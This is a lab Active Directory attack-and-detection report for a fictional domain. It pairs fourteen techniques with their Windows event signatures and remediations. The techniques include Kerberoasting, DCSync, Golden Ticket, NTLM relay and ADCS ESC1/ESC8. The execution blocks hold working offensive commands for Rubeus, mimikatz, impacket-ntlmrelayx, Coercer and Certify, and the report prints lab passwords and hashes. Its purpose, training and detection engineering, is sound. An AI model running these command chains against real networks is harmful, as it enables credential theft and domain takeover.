# Active Directory Attack & Detection Assessment — EAGLE.LOCAL

**Analyst:** Carvajal-Hc
**Version:** 2.0 (consolidated)
**Classification:** Lab exercise — HTB Academy "Windows Attacks & Defense"

> **Confidentiality.** This report documents a security assessment performed on a controlled lab environment for training and to demonstrate defensive analysis capability. All systems, accounts, addresses, hashes, and SIDs are fictitious and do not correspond to any production infrastructure.

---

## 1. About this assessment

Fourteen attack vectors against Active Directory were evaluated in the `eagle.local` domain, every one of them executable from a **standard domain user account with no initial administrative privileges** (`eagle\bob`, simulating an established foothold). The goal was not only to execute each technique but to document the **detection telemetry** each one generates — the Event ID, the differentiating field, and the verification query a SOC would use.

The assessment demonstrates that a single low-privilege foothold can escalate to **full and persistent domain compromise** through multiple independent paths, and that two of those paths (Golden Ticket and ADCS certificates) establish persistence that **survives password rotation**. One countermeasure (the Print Spooler `RegisterSpoolerRemoteRpcEndPoint` fix) was **validated empirically** with a before/after test.

**Overall severity: Critical.**

---

## 2. Scope

**Domain evaluated:** `eagle.local` (NetBIOS: `EAGLE`)

| System | IP | Role |
|--------|-----|------|
| DC1 | 172.16.18.3 | Primary domain controller (security auditing source) |
| DC2 | 172.16.18.4 | Secondary domain controller |
| WS001 | 172.16.18.25 | Workstation — foothold of compromised user `bob`; Unconstrained Delegation |
| SERVER01 | 172.16.18.10 | Member server (share `dev$`); delegation target |
| PKI | 172.16.18.15 | Active Directory Certificate Services (ADCS) |
| Kali (attacker) | 172.16.18.20 | Attacker host for relay and coercion |

**Starting account:** `eagle\bob` — unprivileged domain user.

**Methodology.** Each technique was executed from the workstation, then the telemetry generated on the domain controllers (Windows Security Event Log) was analysed. Every detection is documented with its Event ID, differentiating field, and verification query.

**Limitations.** No network capture (PCAP) was analysed; telemetry is based on Windows Security Event Logs and host firewall logs. Some audit events (e.g. 4768) are recorded only on the DC that services the request, which affects where the evidence appears depending on each attack's flow.

---

## 3. Executive summary

Fourteen distinct vectors were validated, grouped into three phases:

**Credential Access (no privileges required)** — Kerberoasting, AS-REP Roasting, GPP passwords, and plaintext credentials in shares and object attributes. Any domain user can execute these.

**Privilege Escalation & Lateral Movement** — GPO abuse, object ACL abuse, constrained delegation, unconstrained delegation with coercion, and Print Spooler + NTLM relay.

**Domain Dominance & Persistence** — DCSync, Golden Ticket, and ADCS certificate abuse (ESC1, ESC8).

**Key findings**

- The service account `webservice` carries **two stacked vulnerabilities** — it is kerberoastable **and** has constrained delegation to a DC — giving two independent routes to Domain Admin.
- The account `rocky` holds directory replication rights, enabling **DCSync** to extract every credential in the domain, including `krbtgt`.
- The `krbtgt` hash enables **Golden Ticket** forgery — indefinite persistence that only a double password rotation can revoke.
- `WS001` has **Unconstrained Delegation**; coercing a DC to authenticate against it captures the DC's TGT.
- The **Print Spooler + NTLM relay** chain achieves DCSync via a coerced DC's machine identity. **A countermeasure for this was validated empirically.**
- ADCS is vulnerable to **ESC1** (template allowing an arbitrary SAN) and **ESC8** (NTLM relay to the web enrollment endpoint), both yielding authentication certificates for privileged accounts — certificate-based persistence.
- BloodHound revealed that `bob` holds **`GenericAll`** over `anni` and `server01` (object ACL abuse) — escalation paths invisible to manual administration.

**Impact.** The entire domain credential set must be considered compromised. Because two persistence methods (Golden Ticket, certificates) survive password changes, remediation is **not** complete with a password reset — it requires certificate revocation and a double `krbtgt` rotation.

---

## 4. Technical analysis

Each technique follows the same structure: **Description → Execution → Analysis → Detection.** The Detection block is the analyst's deliverable — data source, differentiating field, and verification query.

---

### Phase 1 — Credential Access

### 4.1 Kerberoasting — T1558.003

**Description.** Any authenticated user can request a service ticket (TGS) for any account that has a Service Principal Name (SPN). The ticket is encrypted with the service account's password hash, so it can be extracted and cracked offline — with no crack attempt visible to the DC.

**Execution.**
```
.\Rubeus.exe kerberoast /nowrap /outfile:spn.txt
hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile=cracked.txt
```

**Analysis.** Rubeus queried all SPN accounts via LDAP and extracted their tickets. Offline cracking revealed the password of the decoy account `svc-iam`, confirming its password was in the wordlist used. In a hardened environment, a service password over 25 characters makes cracking infeasible.

**Detection.**
- **Source:** Windows Security — Event ID **4769** (Kerberos service ticket requested)
- **Differentiating field:** **Ticket Encryption Type = 0x17** (RC4) — an attacker-forced cipher downgrade to speed cracking. An AES-only environment should not generate RC4 tickets.
- **Behavioural signal:** a single origin requesting TGS for many SPNs in a short window; a TGS for the honeypot account `svc-iam` (no real service) is malicious by definition.

### 4.2 AS-REP Roasting — T1558.004

**Description.** Accounts with Kerberos pre-authentication disabled return their AS-REP encrypted with the user's hash, without requiring proof of identity first. Any user can request and crack it offline.

**Execution.**
```
.\Rubeus.exe asreproast /user:svc-iam /nowrap /outfile:asrep.txt
# Edit the hash: insert 23$ after $krb5asrep$
hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile=asrepcrack.txt
```

**Analysis.** Two accounts had pre-auth disabled: `anni` (real user) and `svc-iam` (honeypot). The Rubeus hash required manual editing (inserting `23$` to signal RC4) before hashcat accepted it.

**Detection.**
- **Source:** Windows Security — Event ID **4768** (Kerberos TGT requested)
- **Differentiating field:** **Pre-Authentication Type = 0** — the exact condition that enables the attack. Combined with Encryption Type 0x17, this is a high-fidelity detection.
- **SID note:** the target SID is a fixed object attribute, so it can be read straight from AD rather than the event: `svc-iam` → `S-1-5-21-1518138621-4282902758-752445584-3103`.

> **Analyst note.** The object's CN is `svciam` but its SamAccountName is `svc-iam` — a mismatch that makes name-based filters fail. When a filter by name returns nothing, enumerate the real values rather than guessing variants.

### 4.3 GPP Passwords — T1552.006

**Description.** Group Policy Preferences allowed storing credentials in XML files in SYSVOL, encrypted with an AES key Microsoft published. Because SYSVOL is readable by every domain user and the key is universal, anyone can decrypt those credentials.

**Execution.**
```
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
```

**Analysis.** The tool walked the Policies XML files in SYSVOL, located the `cpassword` field, and decrypted it with the known AES key — returning the credential for `svc-iis` in plaintext, no cracking required.

**Detection.**
- **Source:** Windows Security — Event ID **4663** (object access attempt); requires object-access auditing on SYSVOL.
- **Differentiating field:** **Access Mask = 0x1** (ReadData) on `Groups.xml`. The tool only reads the file.
- **Temporal pattern:** a burst of eight reads of the file within the same second — the signature of an automated tool parsing the XML, versus sporadic legitimate access.

### 4.4 Credentials in Shares — T1552.001

**Description.** The most common AD misconfiguration: plaintext credentials in scripts and config files on network shares readable by every domain user.

**Execution.**
```
Import-Module .\PowerView.ps1
Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
cd \\Server01.eagle.local\dev$
findstr /s /i "eagle" *.ps1
```

**Analysis.** `Invoke-ShareFinder` found the hidden share `\\Server01.eagle.local\dev$` (hidden by the `$` suffix but reachable by direct UNC path). A recursive `findstr` for the domain name located the plaintext credential of `Administrator2` in a connection script, as a positional argument after `/user:eagle\Administrator2`.

**Detection.**
- **One-to-many connection:** a workstation connecting to dozens or hundreds of machines in seconds (`Invoke-ShareFinder` behaviour) — impossible in legitimate use.
- Recursive `findstr /s /i` over shares — already flagged by Windows Defender as suspicious.
- Later use of the exposed credential: `Administrator2` logon from an anomalous source (Event 4624/4768).

### 4.5 Credentials in Object Attributes — T1552

**Description.** The free-text `Description` and `Info` fields of user objects are readable by any domain user. Storing credentials in them exposes them to the whole directory.

**Execution.**
```
Get-ADUser -Filter * -Properties Description,Info | Where-Object { $_.Description -like "*pass*" -or $_.Info -like "*pass*" } | Select-Object SamAccountName, Description, Info
```

**Analysis.** Enumeration revealed the account `bonni` with `pass: Slavi1234` in its `Description`. However, the authentication attempt **failed** (System error 86 — wrong password), confirming a **honeypot** account with a fake credential. The decoy indicators were consistent: `PasswordNeverExpires = True`, an old password date, and the credential placed in the most obvious field.

**Detection.**
- **Source:** Windows Security — Event ID **4625/4771/4776** (failed logons).
- **Differentiating field:** any authentication attempt with the decoy account fails, since the exposed credential is fake. A failed `bonni` logon indicates an actor read its `Description` and tried the credential.
- **Limitation:** Event 4738 (user modified) does not record which property changed or its values, so detection is reactive (use), not preventive (exposure). Continuous scanning of Description/Info is the effective defense.

> **Analyst note.** Not every exposed credential is real. A mature attacker verifies context (date consistency, account activity) before using an "easy" credential — the reflex to use it immediately is exactly what trips the honeypot alert.

---

### Phase 2 — Privilege Escalation & Lateral Movement

### 4.6 GPO Abuse — T1484.001

**Description.** Edit permissions on a Group Policy Object are often delegated to low-privilege accounts. Whoever can edit a GPO can add scheduled tasks or scripts that run on every machine in the linked OU — mass escalation.

**Execution.** From the Group Policy Management console on DC1, a GPO was edited to add an immediate scheduled task (`Computer Configuration → Preferences → Scheduled Tasks`) configured to run as `NT AUTHORITY\System`.

**Analysis.** The GPO modification succeeded, proving the account had write permission on the object. In a real scenario the task would run on every computer in the linked OU.

**Detection.**
- **Source:** Windows Security — Event ID **5136** (directory service object modified); requires "Directory Service Changes" auditing.
- **Differentiating field:** a user with **no GPO-administration role** appearing as `SubjectUserName` in a 5136. A well-configured honeypot would auto-disable the modifying account, also generating Event **4725** (account disabled).

### 4.7 Object ACL Abuse — T1098

**Description.** Accumulated permission delegations create escalation paths invisible at a glance. A "small" permission (modify an object) chains up to control of privileged accounts.

**Execution.**
```
.\SharpHound.exe -c All
# Data imported into BloodHound to visualise the relationships
```

**Analysis.** SharpHound collected the domain topology (114 objects). BloodHound revealed that **`bob` holds `GenericAll` over `anni` (user) and `server01` (computer)** — full control of both. These paths are undetectable through manual AD administration; they only emerge by mapping the full graph.

**Detection.**
- **Source:** Event ID **5136** when the permission is abused (adding an SPN for Targeted Kerberoasting, modifying an ACL).
- **Prevention:** audit and minimise delegations; run **BloodHound defensively** on a schedule to find and cut these chains before an attacker uses them.

> **Analyst note.** BloodHound is dual-use: the attacker finds the shortest path to Domain Admin, the defender runs the same tool to eliminate those paths. One of the few tools equally valuable for offense and defense.

### 4.8 Kerberos Constrained Delegation — T1550.003

**Description.** Constrained delegation uses the S4U2Self extension, letting a service account obtain a ticket for any user (including one who never authenticated). The resulting ticket's SPN is modifiable, allowing the access to be widened.

**Execution.**
```
.\Rubeus.exe s4u /user:webservice /rc4:[hash] /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
Enter-PSSession dc1
```

**Analysis.** PowerView identified `webservice` with `msds-allowedtodelegateto` populated with `http/DC1`. Using its NTLM hash (obtained via DCSync), S4U2Self impersonated Administrator and opened a remote session on DC1 — without ever compromising Administrator's real password.

**Detection.**
- **Source:** Windows Security — Event ID **4624** with the S4U extension / protocol transition.
- **Differentiating field:** a service account authenticating as an administrative account is the behavioural anomaly.
- **Prevention:** set "Account is sensitive and cannot be delegated" on privileged accounts — this defeats S4U even if the service account is fully compromised.

> **Analyst note.** `webservice` carries two stacked weaknesses (kerberoastable + delegation), giving two independent routes to Domain Admin. Under-audited service accounts tend to accumulate these risks.

### 4.9 Coercion + Unconstrained Delegation — T1187 / T1550.003

**Description.** A server with Unconstrained Delegation caches in memory the TGT of anyone who authenticates against it. By coercing a DC to authenticate against that server, the DC machine account's TGT is captured.

**Execution.**
```
# On WS001 (Unconstrained Delegation; bob is admin there):
.\Rubeus.exe monitor /interval:1

# From Kali, force DC1 to authenticate against WS001:
Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local

# Capture DC1$ TGT, inject it, and DCSync:
.\Rubeus.exe ptt /ticket:[base64_TGT_DC1$]
lsadump::dcsync /domain:eagle.local /user:Administrator
```

**Analysis.** WS001 was configured with Unconstrained Delegation. Rubeus in monitor mode captured the `DC1$` TGT once Coercer forced its authentication (confirmed by `ERROR_BAD_NETPATH (Attack has worked!)` messages). With the DC's TGT, DCSync extracted the entire domain.

**Detection.**
- **Source:** host firewall logs — Windows offers no native RPC visibility.
- **Differentiating field:** inbound connections to the DC on 445, followed by outbound connections from the DC to the attacker (445), repeated as Coercer probes functions. A DC authenticating against a non-DC machine is anomalous.
- **Prevention:** (1) a third-party RPC firewall; (2) block outbound traffic from DCs to 139/445 except between DCs — the inbound coercion still succeeds, but the DC cannot connect back, so no TGT is captured.

### 4.10 Print Spooler + NTLM Relay — T1187 / T1557

**Description.** The PrinterBug (a Print Spooler RPC function) forces a machine to authenticate against the attacker. Combined with NTLM relay to another DC, it enables DCSync using the coerced DC's machine identity.

**Execution.**
```
# Terminal 1 — relay to DC2:
impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
# Terminal 2 — trigger the PrinterBug on DC1:
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
```

**Analysis.** The PrinterBug forced DC1 to authenticate against Kali; ntlmrelayx relayed that authentication (`EAGLE\DC1$ successfully validated through NETLOGON`) to DC2, running DCSync. Domain credentials were extracted, including Administrator's Kerberos keys (des-cbc-md5: `d9b53b1f6d7c45a8`).

**Countermeasure validation (before/after).** After applying the mitigation on DC1:
```
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Print" -Name "RegisterSpoolerRemoteRpcEndPoint" -PropertyType DWORD -Value 2 -Force
Restart-Computer -Force
```
The same attack, re-run, **failed** with `STATUS_OBJECT_NAME_NOT_FOUND`. The remote spooler named pipe was removed, breaking the PrinterBug at its first link without affecting local printing.

**Detection.**
- A DC authenticating against a non-DC machine (Event 4624 / firewall logs).
- **Prevention confirmed:** `RegisterSpoolerRemoteRpcEndPoint=2` neutralises the attack. Mandatory SMB signing additionally breaks the relay itself.

> **Analyst note.** This section provides the report's most valuable evidence: an **empirically validated** countermeasure. The attack succeeded with default configuration and failed after the mitigation, demonstrated within the same assessment.

---

### Phase 3 — Domain Dominance & Persistence

### 4.11 DCSync — T1003.006

**Description.** An account with directory replication rights can impersonate a domain controller and request credential replication, extracting hashes without touching NTDS.dit or running code on the DC.

**Execution.**
```
runas /user:eagle\rocky cmd.exe
mimikatz.exe
lsadump::dcsync /domain:eagle.local /user:Administrator
```

**Analysis.** The `rocky` account holds "Replicating Directory Changes" and "Replicating Directory Changes All". Under its context, the NTLM hash of Administrator (`fcdc65703dd2b0bd789977f1f3eeaecf`, SID -500) was replicated directly from the DC.

**Detection.**
- **Source:** Windows Security — Event ID **4662** — Task Category: **Directory Service Access**
- **Differentiating field:** Access Mask **0x100** (Control Access) + property GUID **1131f6ad-9c07-11d1-f79f-00c04fc2dcd2** (Replicating Directory Changes All), where `SubjectUserName` is a **user** account (`rocky`) and **not** a DC. Legitimate replication is always performed by a DC (account ending in `$`).
- **SIEM rule:** `EventCode=4662 Access_Mask=0x100 Account_Name!=*$`

### 4.12 Golden Ticket — T1558.001

**Description.** The `krbtgt` account signs every TGT in the domain. Whoever obtains its hash can forge valid TGTs for any user and privilege — total, persistent domain control.

**Execution.**
```
lsadump::dcsync /domain:eagle.local /user:krbtgt
kerberos::golden /domain:eagle.local /sid:[SID] /rc4:[krbtgt_hash] /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
```

**Analysis.** The `krbtgt` hash (SID -502) was extracted via DCSync and used to forge a TGT for Administrator, injected into the session. The `/renewmax:7 /endin:8` parameters set a realistic lifetime; omitting them yields 10-year tickets that EDR flags.

**Detection.**
- The forgery **generates no event** (it happens offline). Only use is detectable:
  - Event **4624** of a privileged account from an anomalous source.
  - A TGS request (4769) with no corresponding prior TGT (4768).
  - Tickets with abnormally long lifetimes.
- **Prevention:** double `krbtgt` rotation. The account's password history keeps two values, so a single rotation leaves the previous password still valid for signing tickets.

> **Analyst note.** This attack is precisely why "rotate krbtgt twice" appears in any domain-compromise report — executing it makes tangible why a double rotation is the only real defense.

### 4.13 ADCS — ESC1 — T1649

**Description.** A certificate template that lets low-privilege users request certificates specifying an arbitrary Subject Alternative Name (SAN), for client authentication, allows obtaining a certificate in any user's name.

**Execution.**
```
.\Certify.exe find /vulnerable
.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:administrator
# Convert PEM to PFX (fix formatting with sed if needed), then authenticate:
openssl pkcs12 -in cert.pem -keyex -export -out cert.pfx
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show /nowrap /dc:dc1.eagle.local
```

**Analysis.** The `UserCert` template allowed `ENROLLEE_SUPPLIES_SUBJECT`. A certificate was requested with `/altname:administrator`, yielding a certificate with `otherName: UPN::Administrator` in the SAN — valid to authenticate as Administrator. The certificate is persistence that survives password rotation.

**Detection.**
- **Source:** Event ID **4886** (certificate requested) + **4887** (certificate issued) on the CA server.
- **Differentiating field:** a low-privilege user requesting a certificate with the SAN of an administrative account. The event's **Requester** field identifies who asked.
- **Prevention:** disable `ENROLLEE_SUPPLIES_SUBJECT`; restrict enrollment rights; require manager approval.

### 4.14 ADCS — ESC8 (NTLM Relay to Certificates) — T1649 / T1557

**Description.** The ADCS web endpoint (`/certsrv`) accepts relayable NTLM authentication. By coercing a DC to authenticate and relaying that authentication to the web endpoint, ADCS issues a certificate for the DC.

**Execution.**
```
# Relay to the ADCS web interface, requesting a DC template:
impacket-ntlmrelayx -t http://172.16.18.15/certsrv/certfnsh.asp --template DomainController -smb2support --adcs
# Coerce the DC:
python3 ./dementor.py [KALI_IP] 172.16.18.4 -u bob -d eagle.local -p Slavi123
```

**Analysis.** A DC was forced to authenticate against Kali; ntlmrelayx relayed that authentication to the ADCS web endpoint, which issued a certificate for the DC's machine account. With that certificate, the attacker can authenticate as the DC.

**Detection.**
- **Source:** Event ID **4886** + **4887** on the PKI server.
- **Key field:** the **Requester** field shows the coerced DC's machine account (`EAGLE\...$`). A Domain Controller certificate requested in a relay context is the anomaly.
- **Prevention:** enable Extended Protection for Authentication (EPA) on the ADCS web endpoint; disable NTLM; require HTTPS with channel binding.

---

## 5. Consolidated IoCs & detection

| Technique | MITRE | Event ID | Differentiating signature |
|-----------|-------|----------|---------------------------|
| Kerberoasting | T1558.003 | 4769 | Encryption Type `0x17` (RC4) |
| AS-REP Roasting | T1558.004 | 4768 | Pre-Auth Type `0` |
| GPP Passwords | T1552.006 | 4663 | Access Mask `0x1` on Groups.xml |
| Credentials in shares | T1552.001 | 4624 / — | One-to-many connection + recursive findstr |
| Credentials in attributes | T1552 | 4625/4771/4776 | Failed logon of honeypot account |
| GPO abuse | T1484.001 | 5136 | Unauthorised user modifying a GPO |
| Object ACL abuse | T1098 | 5136 | ACL/SPN modification by a common user |
| Constrained delegation | T1550.003 | 4624 | S4U extension; service impersonating admin |
| Coercion + Unconstrained | T1187 | firewall | DC authenticating against a non-DC (445) |
| Print Spooler + relay | T1557 | 4624 / firewall | DC$ authenticating against the attacker |
| DCSync | T1003.006 | 4662 | Access Mask `0x100` + replication GUID, initiator ≠ DC |
| Golden Ticket | T1558.001 | 4624 | Privileged logon with no prior TGT; abnormal ticket lifetime |
| ADCS ESC1 | T1649 | 4886 / 4887 | Common user requesting a cert with an admin SAN |
| ADCS ESC8 | T1649 | 4886 / 4887 | Requester = DC machine account via relay |

**Accounts of interest**

| Account | Weakness | Path to compromise |
|---------|----------|--------------------|
| `webservice` | Kerberoastable **and** constrained delegation to DC1 | Two independent routes to Domain Admin |
| `rocky` | Directory replication rights | DCSync → whole domain |
| `svc-iis` | Credential in GPP (SYSVOL) | Direct access |
| `Administrator2` | Credential in share `dev$` | Direct access |
| `anni` | Target of ACL abuse (`bob` has GenericAll) | Escalation via object control |
| `svc-iam`, `bonni` | Honeypot accounts | Attacker detection |

**Key IoCs**

| Type | Value |
|------|-------|
| Administrator NTLM hash (DCSync) | `fcdc65703dd2b0bd789977f1f3eeaecf` (SID -500) |
| Replication property GUID | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` |
| svc-iam SID | `S-1-5-21-1518138621-4282902758-752445584-3103` |
| Spooler mitigation | `HKLM\SYSTEM\CurrentControlSet\Control\Print\RegisterSpoolerRemoteRpcEndPoint = 2` |

---

## 6. Recommendations

**Immediate (0–72h)**
1. Rotate `krbtgt` twice (minimum 10h between rotations) — invalidates existing Golden Tickets.
2. Set "Account is sensitive and cannot be delegated" on all privileged accounts.
3. Revoke directory replication rights on `rocky` and any non-DC account.
4. Remove the `Administrator2` credential from share `dev$` and the `svc-iis` credential from SYSVOL GPP; rotate both.
5. Set `RegisterSpoolerRemoteRpcEndPoint=2` on all DCs (validated countermeasure); remediate vulnerable ADCS templates (ESC1) and enable EPA on the web endpoint (ESC8).

**Short-term (1–4 weeks)**
6. Set service-account passwords over 25 characters (mitigates Kerberoasting); enable Kerberos pre-authentication on all accounts (mitigates AS-REP Roasting); disable RC4, forcing AES.
7. Migrate Unconstrained/Constrained delegation to Resource-Based Constrained Delegation; audit SERVER01 and WS001.
8. Block outbound traffic from DCs to 139/445 except between DCs (mitigates coercion); enable mandatory SMB signing (breaks NTLM relay).
9. Run BloodHound as a defensive audit; cut the ACL paths (`bob` → `anni`/`server01`). Continuously scan Description/Info fields and shares for credentials.

**Structural**
10. Implement Privileged Access Workstations (PAW) for all administrative access, so any privileged logon outside those machines is an immediate alert.
11. Deploy the section 5 detections in the SIEM, prioritising the high-fidelity ones (4662 with Access Mask 0x100; 4769/4768 with RC4/Pre-Auth 0; 4886/4887 with an anomalous Requester).
12. Tier ADCS and DNS/PKI as Tier-0 systems (DC level).

---

## 7. Appendix — commands used

| Technique | Primary command |
|-----------|-----------------|
| Kerberoasting | `Rubeus kerberoast /nowrap` → `hashcat -m 13100` |
| AS-REP Roasting | `Rubeus asreproast /nowrap` → `hashcat -m 18200` |
| GPP Passwords | `Get-GPPPassword` |
| Credentials in shares | `Invoke-ShareFinder` → `findstr /s /i "eagle"` |
| Credentials in attributes | `Get-ADUser -Filter * -Properties Description,Info` |
| GPO abuse | GPMC → Scheduled Task in a GPO |
| Object ACL abuse | `SharpHound -c All` → BloodHound |
| Constrained delegation | `Rubeus s4u /impersonateuser:Administrator /msdsspn:"http/dc1" /ptt` |
| Coercion + Unconstrained | `Rubeus monitor` + `Coercer -l ws001 -t dc1` |
| Print Spooler + relay | `ntlmrelayx -t dcsync://DC2` + `dementor.py` |
| DCSync | `lsadump::dcsync /user:Administrator` |
| Golden Ticket | `kerberos::golden /user:Administrator /id:500 /ptt` |
| ADCS ESC1 | `Certify request /template:UserCert /altname:administrator` |
| ADCS ESC8 | `ntlmrelayx --adcs --template DomainController` + `dementor.py` |

---

*Lab assessment based on the HTB Academy "Windows Attacks & Defense" module. Detections mapped to MITRE ATT&CK.*
